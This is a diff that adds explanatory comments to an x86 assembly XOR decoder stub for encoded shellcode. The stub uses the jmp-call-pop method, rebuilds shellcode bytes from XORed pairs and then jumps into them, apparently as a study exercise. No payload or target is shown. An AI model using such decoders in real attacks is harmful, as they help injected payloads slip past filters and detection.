@@ -11,27 +11,27 @@ global _start
 
 section .text
 _start:
-    jmp short call_shellcode
+    jmp short call_shellcode        ; jmp-call-pop method
 
 decoder:
-    pop esi
-    lea edi, [esi + 1]
-    xor eax, eax
-    xor ebx, ebx
-    xor edx, edx
-    xor ecx, ecx
+    pop esi                         ; Get the address of EncodedShellcode
+    lea edi, [esi + 1]              ; edi points to the next byte
+    xor eax, eax                    ; zero out register
+    xor ebx, ebx                    ; zero out register
+    xor edx, edx                    ; zero out register
+    xor ecx, ecx                    ; zero out register
 
 decode:
-    mov bl, byte [esi + eax]
-    xor bl, 0xaa
-    jz short EncodedShellcode
-    mov dl, byte [esi + eax]
-    mov bl, byte [esi + eax + 1]
-    xor dl, bl 
-    mov byte [esi + ecx], dl
-    add al, 2
-    inc ecx
-    jmp short decode
+    mov bl, byte [esi + eax]        ; Get the byte at esi + eax
+    xor bl, 0xaa                    ; XOR with 0xaa to check if we are at the end of the shellcode
+    jz short EncodedShellcode       ; If we are at the end, we are done, jump to shellcode
+    mov dl, byte [esi + eax]        ; Get the byte at esi + eax 
+    mov bl, byte [esi + eax + 1]    ; Get the byte at esi + eax + 1
+    xor dl, bl                      ; XOR to get orignal shellcode byte
+    mov byte [esi + ecx], dl        ; Overwrite EncodedShellcode at byte esi + ecx with the result
+    add al, 2                       ; Add 2 to eax to jump to the next pair of bytes
+    inc ecx                         ; increment ecx which byte to overwrite in EncodedShellcode
+    jmp short decode                ; loop back to decode
 
 call_shellcode:
     call decoder
